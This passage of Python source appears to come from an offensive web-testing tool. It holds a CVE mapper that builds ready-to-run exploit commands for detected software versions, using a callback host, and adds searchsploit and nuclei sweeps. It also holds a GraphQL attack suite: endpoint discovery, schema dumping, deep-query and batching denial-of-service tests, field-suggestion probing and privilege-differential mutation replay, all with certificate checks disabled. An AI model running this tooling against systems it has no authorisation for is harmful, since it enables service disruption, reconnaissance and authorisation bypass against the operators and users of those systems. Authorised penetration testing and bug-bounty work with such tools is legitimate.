    """Offline version-to-CVE mapping. Given a tech_stack (from whatweb / httpx -tech-detect),
    returns concrete exploit commands to test. Uses the built-in _CVE_DATABASE for known
    high-impact CVEs and (if available) external tools: searchsploit / nuclei templates.

    Workflow:
        mapper = CveMapper()
        plan = mapper.plan(tech_stack={'Apache': '2.4.49', 'PHP': '7.4'}, target='http://t.com')
        # plan = [{'cve': 'CVE-2021-41773', 'title': ..., 'command': 'curl ...', 'severity': 'critical'}, ...]
    """

    def __init__(self, use_searchsploit: bool = True, use_nuclei: bool = True):
        self.use_searchsploit = use_searchsploit
        self.use_nuclei = use_nuclei
        from shutil import which
        self._has_searchsploit = which("searchsploit") is not None
        self._has_nuclei = which("nuclei") is not None

    @staticmethod
    def _match_tech(tech_name: str) -> List[dict]:
        """Find DB entries whose tech patterns match the given tech_name."""
        t = (tech_name or "").lower().strip()
        out: List[dict] = []
        for entry in _CVE_DATABASE:
            if any(p in t or t in p for p in entry["tech"]):
                out.append(entry)
        return out

    def lookup(self, tech_name: str, version: str = "") -> List[dict]:
        """Return CVEs that match this tech+version. Each entry includes cve, title, severity, kind."""
        results: List[dict] = []
        for entry in self._match_tech(tech_name):
            try:
                if not entry["vuln_if"](version or ""):
                    continue
            except Exception:
                continue
            results.append({
                "tech": tech_name,
                "version": version,
                "cve": entry["cve"],
                "title": entry["title"],
                "severity": entry["severity"],
                "kind": entry["kind"],
            })
        return results

    def plan(self, tech_stack: dict, target: str, oast_host: str = "") -> List[dict]:
        """Build an ordered exploit plan: for each tech in stack, look up CVEs and emit a
        concrete command. Higher-severity entries first.
        Returns list of dicts: {cve, title, severity, kind, command, source}."""
        plan: List[dict] = []
        oast = oast_host or (getattr(get_oob(), 'oast_url', lambda: '')().replace("http://", "").replace("https://", "") or "oast.fake")
        for tech, ver in (tech_stack or {}).items():
            cves = self.lookup(tech, ver or "")
            for c in cves:
                # Find original DB entry to get the template
                entry = next((e for e in self._match_tech(tech)
                              if e["cve"] == c["cve"]), None)
                if not entry:
                    continue
                cmd = entry["exploit"].format(target=target, oast=oast)
                plan.append({
                    "tech": tech, "version": ver, "cve": c["cve"],
                    "title": c["title"], "severity": c["severity"],
                    "kind": c["kind"], "command": cmd, "source": "x19-cve-db",
                })
        # Sort: critical first, then high, etc.
        sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        plan.sort(key=lambda x: sev_order.get(x.get("severity", "low"), 5))
        # If searchsploit is around, also append searchsploit queries (lower-priority)
        if self.use_searchsploit and self._has_searchsploit and tech_stack:
            for tech in tech_stack.keys():
                cmd = f"searchsploit --nmap '{tech}' 2>/dev/null | head -20"
                plan.append({
                    "tech": tech, "version": "", "cve": f"EXPLOITDB-{tech}",
                    "title": f"searchsploit query for {tech}", "severity": "info",
                    "kind": "exploit-search", "command": cmd, "source": "searchsploit",
                })
        # If nuclei is around, append a template-driven nuclei call
        if self.use_nuclei and self._has_nuclei:
            plan.append({
                "tech": "", "version": "", "cve": "NUCLEI-CVE-SWEEP",
                "title": "nuclei CVE templates sweep", "severity": "info",
                "kind": "nuclei", "command": f"nuclei -u {target} -t cves -severity critical,high -silent -rl 50 2>/dev/null | head -50",
                "source": "nuclei",
            })
        return plan

    def plan_as_commands(self, tech_stack: dict, target: str, oast_host: str = "",
                        max_n: int = 15) -> List[str]:
        """Convenience: return just the command strings (top N by severity)."""
        return [p["command"] for p in self.plan(tech_stack, target, oast_host)[:max_n]]


class GraphQLAttacker:
    """GraphQL attack suite: introspection, deep-query DoS, batching,
    field-suggestion info leak, mutation authz differential.

    Real-world high-payout bugs: missing depth limit (DoS), batching auth bypass,
    introspection leaking internal schema, mutation-level IDOR.
    """

    DEFAULT_PATHS = (
        "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
        "/graph", "/api/graph", "/query", "/gql", "/graphql/v1",
        "/graphql/console", "/altair", "/playground",
    )

    INTROSPECTION_QUERY = '{"query":"{__schema{queryType{name}mutationType{name}types{name,kind,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}"}'
    TYPENAME_QUERY      = '{"query":"{__typename}"}'
    FIELD_SUGGEST_QUERY = '{"query":"{__schema{queryType{fields{name}}}}"}'

    def __init__(self, endpoint: str = "", cookie: str = "", timeout: int = 10):
        self.endpoint = endpoint
        self.cookie = cookie
        self.timeout = timeout
        self.findings: List[dict] = []
        self.introspection: dict = {}

    def discover(self, base_url: str, cookie: str = "") -> str:
        """Probe common GraphQL paths. Returns the first one that responds as GraphQL, or ''."""
        self.cookie = cookie or self.cookie
        for path in self.DEFAULT_PATHS:
            url = base_url.rstrip("/") + path
            try:
                r = requests.post(url, json={"query": self.TYPENAME_QUERY},
                                  headers={"Cookie": self.cookie, "Content-Type": "application/json",
                                           "User-Agent": "X19-GraphQL/1.0"},
                                  timeout=self.timeout, verify=False)
                if r.status_code == 200 and "__typename" in r.text:
                    self.endpoint = url
                    return url
            except requests.exceptions.RequestException:
                continue
        return ""

    def introspect(self) -> dict:
        """Run full introspection. Returns parsed schema or {'error': ...}."""
        if not self.endpoint:
            return {"error": "no endpoint set; call discover() or set .endpoint"}
        try:
            r = requests.post(self.endpoint,
                              json={"query": self.INTROSPECTION_QUERY},
                              headers={"Cookie": self.cookie, "Content-Type": "application/json"},
                              timeout=self.timeout, verify=False)
            if r.status_code != 200:
                return {"error": f"introspection {r.status_code}: {r.text[:200]}"}
            data = r.json()
            if "errors" in data and "data" not in data:
                # Some servers reject introspection — that's itself a finding
                self.findings.append({
                    "severity": "info",
                    "title": "GraphQL introspection disabled (or restricted)",
                    "detail": f"Server returned errors: {data.get('errors')}",
                    "endpoint": self.endpoint,
                })
                return {"errors": data.get("errors")}
            self.introspection = data.get("data", {})
            # If we got a schema dump, that's a high-severity finding
            types = self.introspection.get("__schema", {}).get("types", [])
            user_types = [t for t in types if t.get("kind") in ("OBJECT", "INPUT_OBJECT")
                          and not t["name"].startswith("__")]
            self.findings.append({
                "severity": "high",
                "title": f"GraphQL introspection enabled ({len(user_types)} types leaked)",
                "detail": f"Full schema dump returned: {len(user_types)} custom types. Attackers can map entire attack surface.",
                "endpoint": self.endpoint,
                "evidence": f"types: {[t['name'] for t in user_types[:20]]}",
            })
            return self.introspection
        except Exception as e:
            return {"error": str(e)}

    def test_depth(self, depth: int = 50) -> dict:
        """Test deep-nested query: alias a field N levels deep. If server has no depth limit,
        this returns a 200 with all aliases resolved. If it has a limit, server returns an error
        or takes a long time. Measure response time as a DoS signal."""
        if not self.endpoint:
            return {"error": "no endpoint"}
        # Build nested alias: a { a { a { ... } } }
        nested = "a" * depth
        query = "{" + "a{" * depth + " __typename " + "}" * depth + "}"
        try:
            t0 = time.time()
            r = requests.post(self.endpoint, json={"query": "{" + nested + "{__typename}}" + "}" * 1},
                              headers={"Cookie": self.cookie, "Content-Type": "application/json"},
                              timeout=self.timeout * 2, verify=False)
            dt = time.time() - t0
            elapsed_ms = int(dt * 1000)
            ok = r.status_code == 200 and "errors" not in r.text
            # Heuristic: if it returns 200 in <1s for a 50-level query, depth is unlimited
            if ok and elapsed_ms < 2000:
                sev = "high"
                msg = f"Deep query ({depth} levels) returned 200 in {elapsed_ms}ms — NO DEPTH LIMIT"
            elif ok and elapsed_ms < 5000:
                sev = "medium"
                msg = f"Deep query returned 200 but slow ({elapsed_ms}ms) — partial limit"
            else:
                sev = "info"
                msg = f"Deep query rejected or very slow ({elapsed_ms}ms) — likely has limit"
            finding = {
                "severity": sev,
                "title": "GraphQL depth limit test",
                "detail": msg,
                "endpoint": self.endpoint,
                "depth": depth,
                "elapsed_ms": elapsed_ms,
            }
            self.findings.append(finding)
            return finding
        except requests.exceptions.Timeout:
            self.findings.append({
                "severity": "high",
                "title": "GraphQL depth test TIMED OUT",
                "detail": f"Deep query (depth={depth}) exceeded {self.timeout * 2}s. Server may be vulnerable to DoS via deep queries.",
                "endpoint": self.endpoint,
            })
            return {"error": "timeout"}
        except Exception as e:
            return {"error": str(e)}

    def test_batching(self, query: str, n: int = 100) -> dict:
        """Test query batching: send an array of N identical queries. If the server doesn't
        rate-limit, this can amplify a single attack by N times. Returns timing + finding."""
        if not self.endpoint:
            return {"error": "no endpoint"}
        batch = [{"query": query} for _ in range(n)]
        try:
            t0 = time.time()
            r = requests.post(self.endpoint, json=batch,
                              headers={"Cookie": self.cookie, "Content-Type": "application/json"},
                              timeout=self.timeout * 3, verify=False)
            dt = time.time() - t0
            elapsed_ms = int(dt * 1000)
            try:
                data = r.json()
                is_array = isinstance(data, list)
                count = len(data) if is_array else 0
            except Exception:
                is_array = False
                count = 0
            if r.status_code == 200 and is_array and count == n:
                self.findings.append({
                    "severity": "high",
                    "title": f"GraphQL batching accepted ({n} queries in {elapsed_ms}ms)",
                    "detail": f"Server processed {n} batched queries. Brute-force / auth-bypass / rate-limit-bypass via batching is feasible.",
                    "endpoint": self.endpoint, "n": n, "elapsed_ms": elapsed_ms,
                })
                return {"ok": True, "count": count, "elapsed_ms": elapsed_ms}
            self.findings.append({
                "severity": "info",
                "title": "GraphQL batching test",
                "detail": f"Server returned {r.status_code}, is_array={is_array}, count={count}",
                "endpoint": self.endpoint,
            })
            return {"ok": False, "status": r.status_code, "elapsed_ms": elapsed_ms}
        except Exception as e:
            return {"error": str(e)}

    def test_field_suggestion(self) -> dict:
        """Field-suggestion info leak: when you query a field that doesn't exist, GraphQL
        often suggests similar field names. This leaks internal schema info even when
        introspection is disabled."""
        if not self.endpoint:
            return {"error": "no endpoint"}
        try:
            r = requests.post(self.endpoint, json={"query": "{ userProfile secrets aDmIn }"},
                              headers={"Cookie": self.cookie, "Content-Type": "application/json"},
                              timeout=self.timeout, verify=False)
            suggestions = []
            try:
                j = r.json()
                for err in j.get("errors", []):
                    msg = err.get("message", "")
                    if "Did you mean" in msg:
                        suggestions.append(msg)
            except Exception:
                pass
            if suggestions:
                self.findings.append({
                    "severity": "low",
                    "title": "GraphQL field suggestions leak schema",
                    "detail": f"Server suggests field names on typos. Even without introspection, this leaks field names. Disable suggestions in production.",
                    "endpoint": self.endpoint,
                    "evidence": suggestions[:3],
                })
            return {"suggestions": suggestions}
        except Exception as e:
            return {"error": str(e)}

    def test_mutation_authz(self, mutations: List[str], cookie_low: str, cookie_high: str) -> List[dict]:
        """Run each mutation with two cookies. If the low-priv cookie gets a 200 with content
        that should require high-priv, that's a mutation-level IDOR."""
        if not self.endpoint or not mutations:
            return []
        out: List[dict] = []
        for m in mutations[:10]:  # cap
            for label, ck in (("low", cookie_low), ("high", cookie_high)):
                try:
                    r = requests.post(self.endpoint, json={"query": m},
                                      headers={"Cookie": ck, "Content-Type": "application/json"},
                                      timeout=self.timeout, verify=False)
                    if r.status_code == 200 and "errors" not in r.text and len(r.text) > 50:
                        out.append({
                            "severity": "high" if label == "low" else "info",
                            "title": f"Mutation accessible to {label} cookie",
                            "detail": f"{label}-priv cookie can execute: {m[:120]}",
                            "endpoint": self.endpoint, "evidence": r.text[:200],
                        })
                except Exception:
                    pass
        self.findings.extend(out)
        return out

    def full_attack(self, cookie: str = "", cookie_low: str = "", cookie_high: str = "") -> List[dict]:
        """Run the full suite: discover → introspect → depth → batching → field-suggestion.
        cookie is used for most tests; cookie_low/cookie_high used for mutation authz."""
        if cookie:
            self.cookie = cookie
        if not self.endpoint:
            return [{"error": "no endpoint"}]
        self.introspect()
        self.test_depth()
        self.test_batching("{__typename}")
        self.test_field_suggestion()
        if cookie_low and cookie_high:
            # Extract a few mutations from the schema (best-effort)
            mutations = []
            for t in self.introspection.get("__schema", {}).get("types", []):
                if t.get("kind") == "OBJECT" and t.get("name", "").lower() in ("mutation", "mutations", "mutationroot"):
                    for f in t.get("fields", []):
                        # Build a minimal mutation: mutationName(input: "") { __typename }
                        arg_str = ",".join(f"${a['name']}:String" for a in f.get("args", []))
                        mutations.append(f"mutation({arg_str}){{ {f['name']}({','.join(a['name']+':\"test\"' for a in f.get('args', []))}){{__typename}} }}")
                    break
            if mutations:
                self.test_mutation_authz(mutations, cookie_low, cookie_high)
        return self.findings


def _cvss_from_severity(sev: str) -> Tuple[float, str]:
    """Rough CVSS v3 estimate from a severity label. Returns (score, vector)."""
    s = (sev or "").lower()
    if s == "critical":
        return 9.8, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    if s == "high":
        return 7.5, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    if s == "medium":
        return 5.3, "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
    if s == "low":
        return 3.7, "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N"
    return 0.0, ""
